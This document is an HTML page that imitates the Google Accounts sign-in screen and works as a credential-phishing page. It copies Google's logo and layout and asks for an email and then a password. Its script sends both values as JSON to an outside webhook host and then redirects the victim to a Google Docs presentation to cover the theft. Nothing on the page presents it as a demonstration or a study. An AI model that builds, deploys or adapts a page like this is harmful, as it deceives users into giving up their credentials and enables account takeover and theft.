<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #fff; color: #202124; }
        .container { width: 450px; margin: 0 auto; }
        .logo { text-align: center; margin-bottom: 20px; }
        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; }
        h1 { text-align: center; font-size: 24px; font-weight: 400; margin-bottom: 30px; }
        input[type="email"], input[type="password"] { width: 100%; padding: 13px 15px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        input:focus { outline: none; border-color: #1a73e8; }
        .next-button, .submit-button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; }
        .next-button:hover, .submit-button:hover { background: #1b66c9; }
        .footer { text-align: center; margin-top: 40px; color: #5f6368; font-size: 12px; }
        #passwordSection { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        <div class="card">
            <h1>Sign in</h1>
            <div id="emailSection">
                <p>Use your Google Account</p>
                <input type="email" id="email" placeholder="Email or phone">
                <button class="next-button" onclick="showPassword()">Next</button>
            </div>
            <div id="passwordSection">
                <p>Enter your password</p>
                <input type="password" id="password" placeholder="Password">
                <button class="submit-button" onclick="submitData()">Sign in</button>
            </div>
        </div>
        <div class="footer">
            <a href="#" style="color: #1a73e8;">Help</a> • <a href="#" style="color: #1a73e8;">Privacy</a> • <a href="#" style="color: #1a73e8;">Terms</a>
        </div>
    </div>

    <script>
        function showPassword() {
            document.getElementById('emailSection').style.display = 'none';
            document.getElementById('passwordSection').style.display = 'block';
        }

        function submitData() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Send data to webhook
            fetch('https://few-smartphone-06.webhook.cool', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            })
            .then(() => {
                // Redirect after sending data
                window.location.href = 'https://docs.google.com/presentation/d/1n1_hljIBtjcLxVwecAur5VgTHTK1bvhBwe8a9xnvLA4/edit?slide=id.p#slide=id.p';
            });
        }

        // Handle Enter key for email field
        document.getElementById('email').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                showPassword();
            }
        });

        // Handle Enter key for password field
        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitData();
            }
        });
    </script>
</body>
</html>
